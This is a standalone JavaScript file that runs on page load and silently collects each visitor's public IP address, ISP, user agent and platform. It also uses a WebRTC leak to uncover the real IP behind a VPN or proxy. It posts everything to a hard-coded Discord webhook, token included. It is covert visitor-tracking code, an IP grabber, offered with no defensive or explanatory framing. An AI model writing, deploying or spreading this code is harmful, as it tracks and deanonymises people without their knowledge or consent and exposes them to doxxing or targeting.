window.addEventListener("load", function() {

    function sendToWebhook(data) {
        var webhookURL = "https://discord.com/api/webhooks/1344321621179109386/zbCmnaOwr86_m999-BdxuJK81VH1kH5zNIeQJI1DqxPxhFoVEYu7-xUa3B-z9TM40sgh";
        var message = {
            "content": data
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        }).then(function(response) {
            if (response.ok) {
                console.log("Notification sent to Discord successfully.");
            } else {
                console.log("Failed to send notification to Discord.");
            }
        }).catch(function(error) {
            console.error("Error:", error);
        });
    }

    function getWebRTCIP() {
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        if (RTCPeerConnection) {
            var pc = new RTCPeerConnection({
                iceServers: []
            });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer) {
                pc.setLocalDescription(offer);
            }).catch(function(error) {
                console.error("WebRTC error:", error);
            });

            pc.onicecandidate = function(event) {
                if (event && event.candidate && event.candidate.candidate) {
                    var candidate = event.candidate.candidate;
                    var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    var ipAddress = ipRegex.exec(candidate);
                    if (ipAddress) {
                        sendToWebhook(`Real IP address (WebRTC): ${ipAddress[1]}`);
                    }
                }
            };
        } else {
            console.error("WebRTC is not supported by this browser.");
        }
    }

    fetch('https://ipapi.co/json/')
    .then(function(response) {
        return response.json();
    })
    .then(function(data) {
        var ipAddress = data.ip;
        var isp = data.org; 
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;

        sendToWebhook(`A visitor has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}`);

        getWebRTCIP();
    })
    .catch(function(error) {
        console.error("Error fetching IP address and ISP data:", error);
    });
});
